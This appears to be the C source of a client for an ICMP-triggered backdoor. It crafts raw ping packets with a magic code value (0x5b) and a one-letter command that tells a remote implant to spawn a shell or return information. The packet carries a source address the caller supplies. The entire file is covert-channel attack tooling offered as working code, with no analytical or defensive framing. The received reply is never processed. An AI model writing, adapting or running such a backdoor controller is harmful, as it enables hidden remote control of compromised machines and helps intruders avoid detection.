#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

#define TRIGGER_CODE 0x5b

#ifndef __USE_BSD
# define __USE_BSD		       /* We want the proper headers */
#endif
# include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* Function prototypes */
static unsigned short checksum(int numwords, unsigned short *buff);

int main(int argc, char *argv[])
{
    unsigned char dgram[256];	       /* Plenty for a PING datagram */
    unsigned char recvbuff[256];
    struct ip *iphead = (struct ip *)dgram;
    struct icmp *icmphead = (struct icmp *)(dgram + sizeof(struct ip));
    struct sockaddr_in src;
    struct sockaddr_in addr;
    struct in_addr my_addr;
    struct in_addr serv_addr;
    socklen_t src_addr_size = sizeof(struct sockaddr_in);
    int icmp_sock = 0;
    int one = 1;
    int *ptr_one = &one;
    
    if (argc < 4) {
	fprintf(stderr, "Usage:  %s remoteIP myIP msg\n", argv[0]);
	exit(1);
    }
    
    char *cmd = argv[3];
    if(strcmp(cmd, "S") == 0) {
        fprintf(stdout,"Spawning shell...\n");
    } else if(strcmp(cmd, "I") == 0) {
        fprintf(stdout, "Getting info...\n");
    } else {
        fprintf(stderr, "Unrecognized command: %s\n", cmd);
        exit(1);
    }

    /* Get a socket */
    if ((icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
	fprintf(stderr, "Couldn't open raw socket! %s\n",
		strerror(errno));
	exit(1);
    }

    /* set the HDR_INCL option on the socket */
    if(setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL,
		  ptr_one, sizeof(one)) < 0) {
	close(icmp_sock);
	fprintf(stderr, "Couldn't set HDRINCL option! %s\n",
	        strerror(errno));
	exit(1);
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(argv[1]);
    
    my_addr.s_addr = inet_addr(argv[2]);
    
    memset(dgram, *cmd, sizeof(dgram));
    memset(recvbuff, 0x00, sizeof(recvbuff));
    
    /* Fill in the IP fields first */
    iphead->ip_hl  = 5;
    iphead->ip_v   = 4;
    iphead->ip_tos = 0;
    iphead->ip_len = 84;
    iphead->ip_id  = (unsigned short)rand();
    iphead->ip_off = 0;
    iphead->ip_ttl = 128;
    iphead->ip_p   = IPPROTO_ICMP;
    iphead->ip_sum = 0;
    iphead->ip_src = my_addr;
    iphead->ip_dst = addr.sin_addr;
    
    /* Now fill in the ICMP fields */
    icmphead->icmp_type = ICMP_ECHO;
    icmphead->icmp_code = TRIGGER_CODE;
    icmphead->icmp_cksum = checksum(42, (unsigned short *)icmphead);
    
    /* Finally, send the packet */
    fprintf(stdout, "Sending request...\n");
    if (sendto(icmp_sock, dgram, 84, 0, (struct sockaddr *)&addr,
	       sizeof(struct sockaddr)) < 0) {
	fprintf(stderr, "\nFailed sending request! %s\n",
		strerror(errno));
	return 0;
    }

    fprintf(stdout, "Waiting for reply...\n");
    if (recvfrom(icmp_sock, recvbuff, 256, 0, (struct sockaddr *)&src,
		 &src_addr_size) < 0) {
	fprintf(stdout, "Failed getting reply packet! %s\n",
		strerror(errno));
	close(icmp_sock);
	exit(1);
    }
	
    iphead = (struct ip *)recvbuff;
    icmphead = (struct icmp *)(recvbuff + sizeof(struct ip));
    
    close(icmp_sock);
    
    return 0;
}

/* Checksum-generation function. It appears that PING'ed machines don't
 * reply to PINGs with invalid (ie. empty) ICMP Checksum fields...
 * Fair enough I guess. */
static unsigned short checksum(int numwords, unsigned short *buff)
{
   unsigned long sum;
   
   for(sum = 0;numwords > 0;numwords--)
     sum += *buff++;   /* add next word, then increment pointer */
   
   sum = (sum >> 16) + (sum & 0xFFFF);
   sum += (sum >> 16);
   
   return ~sum;
}
